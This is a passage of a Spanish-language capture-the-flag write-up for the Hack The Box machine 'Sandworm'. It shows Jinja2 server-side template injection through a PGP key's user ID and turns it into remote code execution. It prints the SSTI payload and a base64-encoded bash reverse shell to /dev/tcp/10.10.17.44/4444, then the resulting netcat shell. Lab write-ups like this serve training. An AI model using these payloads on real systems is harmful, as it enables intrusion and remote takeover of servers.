3mFCa0kvwQoSD+NuimHA+j7aCscYjN5J+RSMV6LEvv9pRoBNbzLn0nae5gIdBP6d
n8VC+Nhw2lbe2bcAEQEAAbQXYXNkZmFzZGYgPGFzZGZAc3NhLmh0Yj6JAdQEEwEK
AD4WIQR7q8toGQLvJx7NEdqhlpV0XbbqJQUCZI8rHgIbAwUJA8JnAAULCQgHAgYV
CgkICwIEFgIDAQIeAQIXgAAKCRChlpV0XbbqJRn6DAC3kGPPOkl5xMsgPBnqpzTw
mM8+R8pZW7GkGLqup/0Vng8U9akdnXzgxRJI4GJZrCfOK0sbHWCLb8wHXQAMTb6v
K9pyrIswPXyJvfMcmAtiP/L50kOffuCyJtgWXFxIbku5gRq3YWlpPytu27bIAvhm
d3YR8zbOlHimHQtz7lHKBDdZUgQDkQUvucExzwbxK0JLksQEmP5X2LXtdGEVTzHy
hnUKXMTG94vcKbbidA/xou3kveUYlPnfs8wrKbEvkTZ6//SNYMB02IAdityZRBUv
eKJIEkJflOdoWMNwQd4lP0HId8SUnOUx+JvhCCios3DuaA4bNwzhCII6CIPYq/hV
yVV9dsSrYPB3dbktx7kegGUrKcZ6hpf4eM1e/l5sHhqWWGj1Zv+a51ukl8aqCAM/
Of16sf+Oa49ffF+LvRFF8xW5dmt7RUtl6giLRML8Vc0fdDVIR3+MGVMjk8t0HLIC
1kzn9Qfj2VIGnQCh72Z9c7RxvaymVDQSRozZkoX7fKm5AY0EZI8rHgEMAMceYjrT
BiJnq3cyk8f3ZuyKe2LJXQ5rE0XH+sDnXfZtFgzqepEUzb1iwaeVJeEB9gJIPitT
AFHvZSjpHc7VVmXkgmsFtZg+f0TJKk177lN6YNxhdMR/z2rUYeEux5RwvRseZ6hT
7DDcxKe7Gvd+ye+Xr9ll62rrConh71Dvm6vd3KC76pnX5Xb4ydQeHU+OvflUuyPS
bW7wIKCBV8sZMv41SA99Hqh068bB8oosabKjEGNh+nOrV90uKBMAtGkhdqNwe05A
rB8ENjYG3Es1AknMjsVjL7+sQsvkBGNRTKGcugsV6n4jwfkQacL9KF9tyvIAukYw
iHi3bEwyKr05JoOOoJlRe5ysx0v48XvO9IdImEN1A3DYUqA4IE7hOy4X66jhi70p
n59si29cY0vyBv2iolnuC3oCFOazkDtIMSrzfYd6IUaFVzcqGXo5yz3QbmAgUQ6a
tLNB0gAL4Bc6terq/q7JoRASF9oPfczhcVdaQsE1mBIvT2jaf/QnhUAcDQARAQAB
iQG8BBgBCgAmFiEEe6vLaBkC7ycezRHaoZaVdF226iUFAmSPKx4CGwwFCQPCZwAA
CgkQoZaVdF226iVMpQv+M3njjaJb7YOWpmHCR4K77iM19+sv0qXTeDi+Ogw+dXpM
Jf7r2EsqmOuTOjqfhOnm3ujZe+1x8F41lrodYqU45AqpNev8Ge8EA/RXXg5e0UeQ
plh2G6TzgFLyFXYSL82hF1VtOrRYHd0uRlww4MBuos3sGe4ikW8B9YpTAbKmUc53
5hHekwCaJiUxEJ0lgP7zG1wCq4XrtpwuoHjcD3QyjKLLSFDN+gxAMNwODmIhjPL5
HSpAo4R6AZQeVANIrtl7wkJadkgh3NtMMzXXCqkrXheJ9GMktMY4hIPklR5pB1KD
A2XLxjtkzcPSjvWLoBVn78nVEnHtbIULHRVy0Nwmf+qJ3wH2nwlctnw8WI7EqaQX
fX5gT4NjJhT8M2mvzEDdDx/ePPddHQpN7aCbjKgnGmhAaXvuawUwq1BGAK3DaVWw
GFM1Hm9jZSiiKyO+iTEskzsVGVhFM0czMaoW8hSTW+ekL2zhstjK2nqN6FKTydCr
O8+C7aPiylWURffzMUQ+
=gOOZ
-----END PGP PUBLIC KEY BLOCK-----
</code></pre></div><p>Ahora ponemos esta clave pública en el sitio web y recibimos un mensaje cifrado:</p><p><img src="/images/HTB/Sandworm/Sandworm-10.webp" alt="Sandworm 10"></p><p>Y podemos descifrarlo de la siguiente manera:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">cat</span> &gt; msg.enc
-----BEGIN PGP MESSAGE-----

hQGMA1/UNxCcIafUAQv/TEJ4cvgGyvvxK9sSZpEbYj1JfgxESkpc60sWI55XIgZd
AcVEGS3WnKk8zYrESzr872Q49D1j9rniWOlun9F5NvQB67XpPEcVsbUPG7ncN32q
aEVhtNPRmS5mbcbbbHNzryjOwYETp+4j7DyFhIzI0I82bJdgtwc9mzbQogkMc64O
i3Q0vj0/H7dZNvD+O9lZfS8avaIxBDvxxZapXUJMF+4OOKMCcDhEdoNeOmq34+Fh
rYR8CsB4ZIAdxrluGBOW9Uyw6BLFj6MkKpl49NPxS6kGLWWp7o1UxIwCrtte2pO1
Yfwa0epuHkkeTy9/9OVs+TBabMscAYYNW9kIO1lzJEx7UeU+RbuUn76OGiQ63B+e
cjd7yw63IsKNAe1tKn3HaEsgjpnJdvzM2Bm8L6I/ezXZZfpiKGVuXLVsDkItt6qx
e6yWu1qfYTYcKxD8bszL9Drf67YcjcT+DUdcLHDE05eNSzu/tSNx+kc474af/U38
270E6B8RzKHQSbFfdxP80sB0AaIG3TlxvKYMYVCDil8Dg1kPYgGo0jG9rq+ZF71V
drmTAbIDvm2faKR184jYX9K5596hG1bs73tFR1nwOw/iTaNGfuDrzSPuhLSWmwhZ
eudVuS7NajnMK4ow9cRsl5SX5totSF0sj+AoBNk9ZoH3EHZiVDScIgN9meAI8vMe
rvQz/OWjVt0jwS1ZAFhaB7dFCKRDYlR024KJ4iDMtJiBFI/C0zYhQPeJcGOsN1Mx
56faV3Qz/xfzDyJgXboKypTK7auTSxJ6VyYVA0pJ50RojUn4rbxdriHC/2wOwpuS
GDzXaUUIzEXJpztBx/+rB1KnppPeoAbLhPDzyuynMCQTUVOcjiBICYbk+iOl2k9g
5UrduTAtsffhc5I7/V5NI/IAX+k0S0oWG5ya+vY8bPdAqtOtq7Y=
=O+o7
-----END PGP MESSAGE-----
^C

<span class="code-cyan">$</span> <span class="code-dark-green">gpg</span> --decrypt <span class="mtku">msg.enc</span>
gpg: cifrado con clave de 3072 bits RSA, ID 5FD437109C21A7D4, creada el 2023-06-18
      "asdfasdf &lt;asdf@ssa.htb&gt;"
This is an encrypted message for asdfasdf &lt;asdf@ssa.htb&gt;.

If you can read this, it means you successfully used your private PGP key to decrypt a message meant for you and only you.

Congratulations! Feel free to keep practicing, and make sure you also know how to encrypt, sign, and verify messages to make your repertoire complete.  

SSA: 06/18/2023-16;05;31
</code></pre></div><p>La última tarea es firmar un mensaje. Podemos hacerlo así:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">rm</span> test<span class="code-blue">*</span>

<span class="code-cyan">$</span> <span class="code-dark-green">echo</span> asdf &gt; test

<span class="code-cyan">$</span> <span class="code-dark-green">gpg</span> --clear-sign <span class="mtku">test</span>

<span class="code-cyan">$</span> <span class="code-dark-green">cat</span> <span class="mtku">test.asc</span>
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

asdf
-----BEGIN PGP SIGNATURE-----

iQGzBAEBCgAdFiEEe6vLaBkC7ycezRHaoZaVdF226iUFAmSPLDAACgkQoZaVdF22  
6iXFYgv9E0M7H3JWd00+xoCgqMpxSnnYbGDNq63lRQAKrlkjP4axZUEkAssg+taI
3zxnorGnVe9R9a9F6GG6FwK+Y7Bwy4m7G8XtYwujRegVqFc0cb1juUOzRL0ckezq
+SX20gtBDAa/CEufEN15LqpVLnwet/5+95fxXPlj05FaK9UO99tNZvQbt5bPGbYm
IvNrJCmCvwTZpFi2lPk6TNV7pRlRSGamyTBaBpsnXPkDmHUy8G0K+QU9+nhuBxze
QgI7wgEAUY6mZ5eFGzgTNPTe8hSJbQ3V4g+uPgsphvNGxdXKWgViBFI2tdNLaIHu
QjZLtoEppnOUNZndl+6R9rBaPXgOm0FDuCiv7selGizBriuaQTrtyk4ZH/s26Dbm
0r3I6hECcxZdIp7ZvKXYbQraIIYGH2GZ4DU7tMx6lLQYLLMUVtDjLypkql7Fl4hb
T1VoaJs8n8WeuE4ubf4w6g99glWFduV35i6Y/z3/BbU5qoEXFAVoP1ocwrQEbWEf
dvJO8qJh
=tOU+
-----END PGP SIGNATURE-----
</code></pre></div><p>Y el sitio web mostrará que la firma es válida:</p><p><img src="/images/HTB/Sandworm/Sandworm-11.webp" alt="Sandworm 11"></p><p><img src="/images/HTB/Sandworm/Sandworm-12.webp" alt="Sandworm 12"></p><h3 id="encontrando-ssti">Encontrando SSTI</h3><p>Dado que estamos tratando con <em>Server-Side Template Injection</em> en Jinja2, pondremos <em>payloads</em> del tipo <code>{{7*7}}</code> para probar si la inyección funciona. Debemos intentarlo en estos sitios:</p><ul><li>Descifrado de mensajes</li><li>Formulario de contacto</li><li>Mensajes firmados</li><li>Nombre de usuario / correo electrónico</li></ul><p>Al final, encontraremos que la inyección funciona en el nombre de usuario / correo electrónico en la función de firmas:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">rm</span> -rf <span class="mtku">~/.gnupg</span>

<span class="code-cyan">$</span> <span class="code-dark-green">gpg</span> --gen-key
gpg (GnuPG) 2.2.27; Copyright (C) 2021 Free Software Foundation, Inc.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

gpg: creado el directorio '/home/kali/.gnupg'
gpg: caja de claves '/home/kali/.gnupg/pubring.kbx' creada
Nota: Usa "gpg --full-generate-key" para el diálogo completo de generación de clave.

GnuPG debe construir un ID de usuario para identificar su clave.

Nombre y apellidos: {{7*7}}
Dirección de correo electrónico: {{8*8}}@ssa.htb
Ha seleccionado este ID de usuario:
    "{{7*7}} &lt;{{8*8}}@ssa.htb&gt;"

¿Cambia (N)ombre, (D)irección o (V)ale/(S)alir? V
Es necesario generar muchos bytes aleatorios. Es una buena idea realizar
alguna otra tarea (trabajar en otra ventana/consola, mover el ratón, usar
la red y los discos) durante la generación de números primos. Esto da al
generador de números aleatorios mayor oportunidad de recoger suficiente
entropía.
Es necesario generar muchos bytes aleatorios. Es una buena idea realizar
alguna otra tarea (trabajar en otra ventana/consola, mover el ratón, usar
la red y los discos) durante la generación de números primos. Esto da al
generador de números aleatorios mayor oportunidad de recoger suficiente
entropía.
gpg: /home/kali/.gnupg/trustdb.gpg: se ha creado base de datos de confianza
gpg: clave 472AD28C6E535785 marcada como de confianza absoluta
gpg: creado el directorio '/home/kali/.gnupg/openpgp-revocs.d'
gpg: certificado de revocación guardado como '/home/kali/.gnupg/openpgp-revocs.d/BB56CBA8229D288D320F08C9472AD28C6E535785.rev'  
claves pública y secreta creadas y firmadas.

pub   rsa3072 2023-06-18 [SC] [caduca: 2025-06-17]
      BB56CBA8229D288D320F08C9472AD28C6E535785
uid                      {{7*7}} &lt;{{8*8}}@ssa.htb&gt;
sub   rsa3072 2023-06-18 [E] [caduca: 2025-06-17]

<span class="code-cyan">$</span> <span class="code-dark-green">rm</span> test<span class="code-blue">*</span>

<span class="code-cyan">$</span> <span class="code-dark-green">echo</span> <span class="code-dark-yellow">'{{9*9}}'</span> &gt; test

<span class="code-cyan">$</span> <span class="code-dark-green">gpg</span> --clear-sign <span class="mtku">test</span>

<span class="code-cyan">$</span> <span class="code-dark-green">cat</span> <span class="mtku">test.asc</span>
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

{{9*9}}
-----BEGIN PGP SIGNATURE-----

iQGzBAEBCgAdFiEEu1bLqCKdKI0yDwjJRyrSjG5TV4UFAmSPLZsACgkQRyrSjG5T
V4VSrgwAj59V1FjgbaiJ/ha6+Ily6dP+ycq0kJ1oWngpktNXdv+uuksJ8spyvZIh
BSQYBg9AjSG+AkFq6YOpvPZPA1kDjHC0ClIHY7PpGyC1CJDmv1wgOT7ULJaVdYsz
OQgT/jglQv99x4C/I2pSoFSJIq2Z+63thtWVHbCUgH0O/y9ikn3Oi6SQvRAYrjxV
dEvhBsfo6fCZ9r+Df5zm3WmnHyj80URlDvZp0TKehgVcAvaEhQPfurTnzRtm7C5H
4qp6fe0eXlXkXuFbcHJ9zDgmziGkhJg65BTCk2kFAyOzzOBpKHC7SwkyC+hdUqhY
cr/VEjEqPA39egiesr245n5B4H6bngnwAqrZfu8qNo3B14dBuO0qfc/J6m8gCIre
V8WH+ZOCD8uiFlKQWzCEN6o/BB27r+GLAn7/V4wOrda4+ZZhQXZP2F4CL39LDSSR
J9dC86GwbZ1bCvBpC5hxNivHI70JdjwhB9FKJkmEV78bEuXzqMJi27q1DpGYKkMT
LdwVd4ZQ
=mqQj
-----END PGP SIGNATURE-----

<span class="code-cyan">$</span> <span class="code-dark-green">gpg</span> --armor --export <span class="code-dark-yellow">'{{8*8}}@ssa.htb'</span>
-----BEGIN PGP PUBLIC KEY BLOCK-----

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
cKxtKXaMB0HLx76yMPiLAm4=
=XNDM
-----END PGP PUBLIC KEY BLOCK-----
</code></pre></div><p>Como antes, ingresamos a la clave pública y al mensaje firmado:</p><p><img src="/images/HTB/Sandworm/Sandworm-13.webp" alt="Sandworm 13"></p><p>Y obtenemos este resultado:</p><p><img src="/images/HTB/Sandworm/Sandworm-14.webp" alt="Sandworm 14"></p><p>Entonces, el ataque SSTI fue exitoso. Derivémoslo a ejecución remota de comandos con el siguiente <em>payload</em> de <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---remote-code-execution">PayloadsAllTheThings</a>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">{{ cycler.__init__.__globals__.os.popen('id').read() }}  
</code></pre></div><p>Usaremos una <em>reverse shell</em> para obtener acceso a la máquina:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> -n <span class="code-dark-yellow">'bash  -i &gt;& /dev/tcp/10.10.17.44/4444 0&gt;&1'</span> | <span class="code-dark-green">base64</span>  
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">rm</span> -rf <span class="mtku">~/.gnupg</span>

<span class="code-cyan">$</span> <span class="code-dark-green">gpg</span> --gen-key
gpg (GnuPG) 2.2.27; Copyright (C) 2021 Free Software Foundation, Inc.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

gpg: creado el directorio '/home/kali/.gnupg'
gpg: caja de claves '/home/kali/.gnupg/pubring.kbx' creada
Nota: Usa "gpg --full-generate-key" para el diálogo completo de generación de clave.

GnuPG debe construir un ID de usuario para identificar su clave.

Nombre y apellidos: {{ cycler.__init__.__globals__.os.popen('echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash').read() }}
Dirección de correo electrónico: asdf@ssa.htb
Ha seleccionado este ID de usuario:
    "{{ cycler.__init__.__globals__.os.popen('echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash').read() }} &lt;asdf@ssa.htb&gt;"

¿Cambia (N)ombre, (D)irección o (V)ale/(S)alir? V
Es necesario generar muchos bytes aleatorios. Es una buena idea realizar
alguna otra tarea (trabajar en otra ventana/consola, mover el ratón, usar
la red y los discos) durante la generación de números primos. Esto da al
generador de números aleatorios mayor oportunidad de recoger suficiente
entropía.
Es necesario generar muchos bytes aleatorios. Es una buena idea realizar
alguna otra tarea (trabajar en otra ventana/consola, mover el ratón, usar
la red y los discos) durante la generación de números primos. Esto da al
generador de números aleatorios mayor oportunidad de recoger suficiente
entropía.
gpg: /home/kali/.gnupg/trustdb.gpg: se ha creado base de datos de confianza
gpg: clave 304FE7360D1EE707 marcada como de confianza absoluta
gpg: creado el directorio '/home/kali/.gnupg/openpgp-revocs.d'
gpg: certificado de revocación guardado como '/home/kali/.gnupg/openpgp-revocs.d/51114BE248A0562325F017D2304FE7360D1EE707.rev'
claves pública y secreta creadas y firmadas.

pub   rsa3072 2023-06-18 [SC] [caduca: 2025-06-17]
      51114BE248A0562325F017D2304FE7360D1EE707
uid                      {{ cycler.__init__.__globals__.os.popen('echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash').read() }} &lt;asdf@ssa.htb&gt;  
sub   rsa3072 2023-06-18 [E] [caduca: 2025-06-17]


<span class="code-cyan">$</span> <span class="code-dark-green">rm</span> test<span class="code-blue">*</span>

<span class="code-cyan">$</span> <span class="code-dark-green">echo</span> asdf &gt; test

<span class="code-cyan">$</span> <span class="code-dark-green">gpg</span> --clear-sign <span class="mtku">test</span>

<span class="code-cyan">$</span> <span class="code-dark-green">cat</span> <span class="mtku">test.asc</span>
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

asdf
-----BEGIN PGP SIGNATURE-----

iQGzBAEBCgAdFiEEURFL4kigViMl8BfSME/nNg0e5wcFAmSPOhcACgkQME/nNg0e
5wcdwwv9Fnnh2bGk6zjJ/wMliQ/QAJj+7x/GWxA1h3JQ8PXyhwrkevbmCHFXOjZi
9oee1NLQXssoH4pBvpHsN2UHmUhJ9lcaC6sMRENWCPJIIy9CKCz0I/+An3DrHsN+
Esga08Z9VrMibUjyrLxMRuuWdRGwcwk+GuZa0qvruSZjjXhXKrpARofa/taLoybS
iSjuahPbhKpbk8GRn9xrSzKIfPTq0E4iERYlGTeSUWBHXNgcjGthiZIWO6i1UqST
4TyEMjEyl4Dq76jD8pNvSKMqe/O5DDvviFOcRnbVjmFGRjMa4/3xo/OGFh6S2PGU
TGI6/1F9UllbOPEjkKam6XjlLd/uWaLc+oLWq/PNFOYTB3HIPMH3RW1GL0x/C71p
COKNvftPQHvTYffEF8O9n1hLJR0TkVUDxbItVaq4gmrXdz9ui99dLWzQNtOjdt4i
Q5GJpMNN23MytUp6GP74sWGLeIWCCDN/r4rg/CWfOAUnonW6gwWfVvedfgjYF7BS
TVb3svxP
=J5ma
-----END PGP SIGNATURE-----

<span class="code-cyan">$</span> <span class="code-dark-green">gpg</span> --armor --export asdf@ssa.htb
-----BEGIN PGP PUBLIC KEY BLOCK-----

mQGNBGSPOgABDADQZ4EstFoyus6avnPlKPhtRoDmwD/BwBdVjE3lUsqTP/mfMYM+
LPNGlIt4MOzs6bN89uDE50LMh/R0FSEtfDaHLA/mmp5qcCe/E2eCRUM9f46COy+H
3D3kmv2f2DTDP5SMGGdhQRGE5EgZ3Bhm8xmFEFCk7M5oJduJYNvSaJ/0dsQpJemF
Y+nJCCR5zGtqA7QEt/kxNtR/ASKlnTvumd72WXwR/35K8mIww9Yu69X+mIFW5nEl
lycBdSGHFbpJbnP7dr4pg6q2p5/LYEtkbNUMYCB8kptJg0hg7+yeStzZH8zqAvdB
Y2RAXx+jQqRB3ZQueCLjF425XXzrG9A2xJURuowGCErP4vYAvM2NGBfeLgHCM4gK
8rxLkdKfllDApnduW57zyQouFV/00Q5d9BOZg60efmEYoEe3Duk+LK0Pk6NMvsyk
ir+cGmvKs/6ahup56SsJXpOIWGnhl3AJ/rTGxVXuEGQQzJGjOV+/TxbKoe3+14s0
340V2R+iDWWq4uEAEQEAAbSUe3sgY3ljbGVyLl9faW5pdF9fLl9fZ2xvYmFsc19f
Lm9zLnBvcGVuKCdlY2hvIFltRnphQ0FnTFdrZ1BpWWdMMlJsZGk5MFkzQXZNVEF1
TVRBdU1UY3VORFF2TkRRME5DQXdQaVl4IHwgYmFzZTY0IC1kIHwgYmFzaCcpLnJl
YWQoKSB9fSA8YXNkZkBzc2EuaHRiPokB1AQTAQoAPhYhBFERS+JIoFYjJfAX0jBP
5zYNHucHBQJkjzoAAhsDBQkDwmcABQsJCAcCBhUKCQgLAgQWAgMBAh4BAheAAAoJ
EDBP5zYNHucHJYML/0nUmDOcn/99i133HOBmB0mFmm63J3A/HxZCbGCw8uI7vGN6
x7b0mtCJp5VYfmk4i3ZwdtH2Rcmt6LE/E7pvUppl72ecs9SE3JJ40vJfQHGHfNTQ
GfjoK9FX0ciYHNMlZP3K0bKGdXD0r96tn0UgxjgUqbbPeHIn7ypSyKF/H729Ag73
62m3V33KfJpZYGaD0Mq0vTNS4Lp4oqS4/RUnQ5/v85CaFB9nhx/IqCX5yfUfMBdJ
zy0WuoreaBNmH6aHKM4ewWAfD/9BeGkRM1gI4Fl4uvHTfrO0/YoagDTZaHPPbT9S
zFa9E62fpLCtmPiAO/Su14qip1OP9hrNXc9IlqbANiKunLKaC9iBtPSls4iJX1lA
Qj+USgGXGxcTB7mFHnFOZQgNReNfyNkQmAKCv5sLBr7ebRYPpO0M5gzrIvdpvuq9
9V4p2RBbkZI+YrbSHMCAAF9ZNIgg0eOC/GysNJg7BP8cY/6eLVGf2ShI3O1MYepg
fnqGYN+yyZ9SvOWXHLkBjQRkjzoAAQwA0NlOiwxMBs1i+wXFa+jOQxHuZTM1xmmp
o3ICIYrM05IphRGfAmQ6bAL3fIDPQifkrkONIFyCexvD+nj/Nrh+7bMC9S0wqvdm
PHarkHWItuVn2CSs9i6XTQ08pN7JQok1hVWYnVL3eBs/Em8Uoe3AWznYUxHRF70k
Xwc6LQbpVc8tKmuLvz+87anOTfatozzwe5p2no/C49PrzY3j317nxnoI+Byle9X4
0kYZIg38b5xbS91G6cLDnE8Fd//CALxqIxQ0gytpxal4SIj5sw0np6UGZ9u84vAL
+YHRZ39N6hQ2xsH4hYBZd/YSL1B1Gyf+dNqeDLNVlhgldW+J+9Db7rFOaXIEzlt2
UKrMKueuxQs02OZxs+zAedFm+xQSVuqU7J5HmD0XACO8lpK1zAk5deZeoReOya0j
mOtw9L4YBUGnyxDQdPuv9vmVeaS05QNK+Tbx3h6daP00ABLy1ywrxE9Hn89HZXEY
2+IE/uHgrMghpAN4K/61kk0wi1s1qGcJABEBAAGJAbwEGAEKACYWIQRREUviSKBW
IyXwF9IwT+c2DR7nBwUCZI86AAIbDAUJA8JnAAAKCRAwT+c2DR7nByruDADB1lGq
jtbCOTUKTRffAOfooQFaqv2NRtNpkzWyWjjiloyzpsgNYeFFdHgJeivW5GpyQwdQ
RWRXnHYvVohB7/CRxUm8jiqiGHkYG35EfUac4mGWCVXeFFVnz3uIzxu/33SmX8wX
BV2QgDyNla57tdNKv02aDmIJvj1vMimdTTW9jAxu4+wJN/Xi1m1bLY37gyFfjm3A
hgL6pjv7NV65eq5N2tMmIMoE90nCXRw+oHQyAPnbMVe25yy3lyzQqrH4nKSS3+Ml
NwRaJY3Tb7aldD1IxK7fdeNGeo6iq9RyS00gIlqhwQWtVA5AGj7fwzABAWeBv57D
PrZi+uID2yx7NMJBNl57DmTj+zS6yA++1hf66jc46gcKT4qdPokpupAJj/OjLPF3
MtXB9Xcge//s2ISnhzxNyvRz/jMH2ps1LKoEZ5ek5adFrNkbjpQlTHXBv5Fx0yst
LUH0QNbriE8Sj55HUMpLM1VvGRJgFvNhNQ/rm5YAm80IyBMXnesGs0Ic8K4=
=Xp2f
-----END PGP PUBLIC KEY BLOCK-----
</code></pre></div><p>Ponemos la clave y el mensaje anteriores y luego tendremos una <em>shell</em> en <code>nc</code>:</p><p><img src="/images/HTB/Sandworm/Sandworm-15.webp" alt="Sandworm 15"></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
Ncat: Version 7.94 ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.218:56814.
bash: cannot set terminal process group (-1): Inappropriate ioctl for device  
bash: no job control in this shell
/usr/local/sbin/lesspipe: 1: dirname: not found
atlas@sandworm:/var/www/html/SSA$
</code></pre></div><h2 id="enumeración-del-sistema">Enumeración del sistema</h2><p>Lo primero que notamos es que no tenemos <code>script</code>, y ni siquiera <code>which</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">atlas@sandworm:/var/www/html/SSA$ script /dev/null -c bash
script /dev/null -c bash
Could not find command-not-found database. Run 'sudo apt update' to populate it.  
script: command not found
atlas@sandworm:/var/www/html/SSA$ which script
which script
Could not find command-not-found database. Run 'sudo apt update' to populate it.
which: command not found
